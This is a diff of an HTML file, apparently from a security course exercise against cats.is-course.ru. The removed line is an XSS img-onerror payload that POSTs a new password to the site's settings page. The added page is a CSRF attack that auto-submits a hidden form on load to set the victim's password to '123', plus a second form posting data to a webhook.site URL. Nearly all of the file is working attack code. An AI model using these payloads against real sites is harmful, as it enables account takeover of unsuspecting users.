@@ -1,2 +1,38 @@
-<img src=invalid onerror=const ddd = new FormData();ddd.append("password", "1235");ddd.append("confirm-password", "1235");fetch('https://cats.is-course.ru/settings', {method: 'POST', body: ddd});>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Form</title>
+    <script>
+        window.onload = function() {
+            var form = document.createElement("form");
+            form.method = "POST";
+            form.action = "https://cats.is-course.ru/settings"; // Target URL
 
+            var passwordInput = document.createElement("input");
+            passwordInput.type = "hidden";
+            passwordInput.name = "password";
+            passwordInput.value = "123";
+            form.appendChild(passwordInput);
+
+            var confirmPasswordInput = document.createElement("input");
+            confirmPasswordInput.type = "hidden";
+            confirmPasswordInput.name = "confirm-password";
+            confirmPasswordInput.value = "123";
+            form.appendChild(confirmPasswordInput);
+
+            document.body.appendChild(form);
+            form.submit(); // Submit the form
+        }
+    </script>
+</head>
+<body>
+    <h1>Admin Login asd</h1>
+    <!-- Form that triggers a CSRF attack -->
+    <form action="https://webhook.site/65d06db1-3fc0-4e77-954d-3d0380378094" method="POST">
+        <input type="hidden" name="important_data" value="malicious_payload">
+        <button type="submit">Click here!</button>
+    </form>
+</body>
+</html>
